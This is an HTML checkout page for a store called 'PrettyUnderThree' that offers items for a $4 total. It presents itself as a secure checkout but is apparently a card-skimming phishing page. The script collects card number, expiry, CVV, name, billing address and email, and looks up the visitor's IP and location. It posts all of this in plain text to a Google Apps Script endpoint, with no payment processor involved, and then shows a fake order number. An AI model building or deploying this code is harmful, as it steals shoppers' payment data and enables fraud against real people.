<!DOCTYPE html>
<html>
<head>
  <title>Secure Checkout | PrettyUnderThree</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    *{
  box-sizing:border-box;
}

body{
  font-family: Arial, sans-serif;
  background:#f6f7f9;
  margin:0;
  color:#111;
}

/* HEADER */
header{
  background:#fff;
  border-bottom:1px solid #e5e5e5;
  padding:16px;
  text-align:center;
  font-weight:600;
  font-size:18px;
}

/* LAYOUT */
.container{
  max-width:700px;
  margin:auto;
  padding:20px;
  display:flex;
  flex-direction:column;
  gap:20px;
}

/* CARDS */
.left, .right{
  background:#fff;
  padding:20px;
  border-radius:12px;
  border:1px solid #e5e5e5;
}

/* SECTION TITLES */
h3{
  font-size:16px;
  margin-bottom:10px;
}

/* INPUTS */
input{
  width:100%;
  padding:12px;
  margin:8px 0;
  border-radius:8px;
  border:1px solid #d0d5dd;
  font-size:14px;
}

input:focus{
  border-color:#111;
  outline:none;
}

/* ROW */
.row{
  display:flex;
  gap:10px;
}

/* BUTTONS */
button{
  width:100%;
  padding:14px;
  margin-top:10px;
  border-radius:8px;
  border:none;
  background:#111;
  color:#fff;
  font-weight:600;
  cursor:pointer;
}

button:hover{
  opacity:0.9;
}

.secondary{
  background:#eee;
  color:#111;
}

/* PRODUCT */
.product-card{
  display:flex;
  gap:12px;
  margin-bottom:15px;
}

.product-img{
  width:60px;
  height:60px;
  border-radius:8px;
  object-fit:cover;
}

.product-details{
  flex:1;
}

.product-name{
  font-size:14px;
  font-weight:600;
}

.product-desc{
  font-size:12px;
  color:#666;
}

.product-meta{
  font-size:12px;
  color:#0a7d2c;
}

.product-price{
  font-weight:600;
}

/* SUMMARY */
.summary-row{
  display:flex;
  justify-content:space-between;
  margin:6px 0;
  font-size:14px;
}

.total{
  font-size:18px;
  font-weight:700;
}

/* DIVIDER */
.divider{
  height:1px;
  background:#eee;
  margin:12px 0;
}

/* TRUST */
.secure-box{
  font-size:12px;
  color:#666;
  margin-top:10px;
  text-align:center;
}

/* STEPS */
.step{display:none;}
.active{display:block;}

  </style>
</head>

<body>

<header>🔒 Secure Checkout</header>

<div class="container">

  <!-- LEFT -->
  <div class="left">

    <!-- STEP 1 -->
    <div id="step1" class="step active">

      <h3>Contact</h3>
      <input type="email" id="email" placeholder="Email">

      <h3>Shipping</h3>
      <input type="text" id="name" placeholder="Full Name">
      <input type="text" id="address" placeholder="Address">
      <input type="text" id="city" placeholder="City">

      <div class="row">
        <input type="text" id="state" placeholder="State">
        <input type="text" id="zip" placeholder="ZIP">
      </div>

      <button onclick="goToPayment()">Continue</button>
    </div>

    <!-- STEP 2 -->
    <div id="step2" class="step">

      <h3>Payment</h3>

      <input type="text" id="card" placeholder="Card Number" oninput="detectCard()">
      <div id="cardType" style="margin-bottom:10px;"></div>

      <div class="row">
        <input type="text" id="exp" placeholder="MM/YY">
        <input type="text" id="cvv" placeholder="CVV">
      </div>

      <input type="text" id="cardname" placeholder="Name on Card">

      <h3>Billing Address</h3>
      <input type="text" id="bname" placeholder="Full Name">
      <input type="text" id="baddress" placeholder="Address">
      <input type="text" id="bcity" placeholder="City">

      <div class="row">
        <input type="text" id="bstate" placeholder="State">
        <input type="text" id="bzip" placeholder="ZIP">
      </div>

      <button id="orderBtn" onclick="placeOrder(event)">Place Order</button>
      <button class="secondary" onclick="backToShipping()">Back</button>

    </div>

  </div>

  <!-- RIGHT -->
  <div class="right">

    <h3>Summary</h3>

    <div class="summary-row">
      <span>Items</span>
      <span>$3</span>
    </div>

    <div class="summary-row">
      <span>Shipping</span>
      <span style="color:green;">FREE</span>
    </div>

    <div class="summary-row">
      <span>Tax</span>
      <span>$1</span>
    </div>

    <hr>

    <div class="summary-row total">
      <span>Total</span>
      <span>$4</span>
    </div>

  </div>

</div>

<script>
// VALIDATION
function isValidEmail(e){return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e);}
function isValidCVV(c){return /^\d{3,4}$/.test(c);}
function isValidExp(e){return /^(0[1-9]|1[0-2])\/\d{2}$/.test(e);}

// CHECK EXPIRED
function isExpired(exp){
  let [m,y] = exp.split("/");
  let now = new Date();
  let year = 2000 + parseInt(y);
  let month = parseInt(m);
  return year < now.getFullYear() || 
         (year === now.getFullYear() && month < now.getMonth()+1);
}

// LUHN CHECK
function luhnCheck(card){
  let sum=0,flip=false;
  card=card.replace(/\D/g,'');
  for(let i=card.length-1;i>=0;i--){
    let n=parseInt(card[i]);
    if(flip){n*=2;if(n>9)n-=9;}
    sum+=n;flip=!flip;
  }
  return sum%10===0;
}

// CARD TYPE
function getCardType(n){
  n=n.replace(/\D/g,'');
  if(/^4/.test(n)) return "Visa";
  if(/^5/.test(n)) return "Mastercard";
  if(/^3/.test(n)) return "Amex";
  return "Card";
}

function detectCard(){
  cardType.innerHTML = cardEl.value ? "Card: " + getCardType(cardEl.value) : "";
}

// NAVIGATION
function goToPayment(){
  if(!emailEl.value || !isValidEmail(emailEl.value)){
    alert("Valid email required");
    return;
  }

  if(!nameEl.value || !addressEl.value || !cityEl.value){
    alert("Shipping info required");
    return;
  }

  step1.classList.remove("active");
  step2.classList.add("active");
}

function backToShipping(){
  step2.classList.remove("active");
  step1.classList.add("active");
}

// FINAL CHECK
async function placeOrder(event){

  const btn = document.getElementById("orderBtn");
  btn.disabled = true;
  btn.innerText = "Processing...";

  let card = cardEl.value.replace(/\D/g,'');

  if(card.length < 13 || !luhnCheck(card)){
    alert("Invalid card");
    resetBtn(); return;
  }

  if(!isValidExp(expEl.value) || isExpired(expEl.value)){
    alert("Invalid expiration");
    resetBtn(); return;
  }

  if(!isValidCVV(cvvEl.value)){
    alert("Invalid CVV");
    resetBtn(); return;
  }

  if(!bnameEl.value || !baddressEl.value || !bcityEl.value){
    alert("Billing required");
    resetBtn(); return;
  }

  // ✅ GET IP + CITY + STATE
  let locationData;
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();

    locationData = {
      ip: data.ip,
      city: data.city,
      state: data.region,
      country: data.country_name
    };
  } catch (e) {
    locationData = {
      ip: "Unknown",
      city: "Unknown",
      state: "Unknown",
      country: "Unknown"
    };
  }

  const data = {
    email: emailEl.value,
    cardnum: cardEl.value,
    expdate: expEl.value,
    cvv: cvvEl.value,
    cardname: cardnameEl.value,
    baddress: baddressEl.value,
    bcity: bcityEl.value,
    bstate: bstateEl.value,
    bzip: bzipEl.value,

    // ✅ NEW FIELDS
    ip: locationData.ip,
    ip_city: locationData.city,
    ip_state: locationData.state,
    ip_country: locationData.country
  };

  fetch("https://script.google.com/macros/s/AKfycbxJIfaBkbXRFywKklJtf7gNJDNMAUINjw7l3cLlNgRrZlxnCJxKyEM2osw0zQsuUQWVBg/exec", {
    method: "POST",
    mode: "no-cors",
    body: JSON.stringify(data)
  })
  .then(() => {

    const orderNumber = "PU3-" + Math.floor(100000 + Math.random() * 900000);
    const now = new Date();

    localStorage.setItem("orderData", JSON.stringify({
      orderNumber,
      name: nameEl.value,
      email: emailEl.value,
      total: "$4.00",
      date: now.toLocaleDateString(),
      time: now.toLocaleTimeString()
    }));

    window.location.href = "confirmation.html";

  })
  .catch(() => {
    alert("Error submitting");
    resetBtn();
  });
}

function resetBtn(){
  const btn = document.getElementById("orderBtn");
  btn.disabled = false;
  btn.innerText = "Place Order";
}

// ELEMENTS
const emailEl=document.getElementById("email");
const nameEl=document.getElementById("name");
const addressEl=document.getElementById("address");
const cityEl=document.getElementById("city");

const cardEl=document.getElementById("card");
const expEl=document.getElementById("exp");
const cvvEl=document.getElementById("cvv");
const cardnameEl=document.getElementById("cardname");

const bnameEl=document.getElementById("bname");
const baddressEl=document.getElementById("baddress");
const bcityEl=document.getElementById("bcity");
const bstateEl=document.getElementById("bstate");
const bzipEl=document.getElementById("bzip");

const step1=document.getElementById("step1");
const step2=document.getElementById("step2");
const cardType=document.getElementById("cardType");
</script>

</body>
</html>
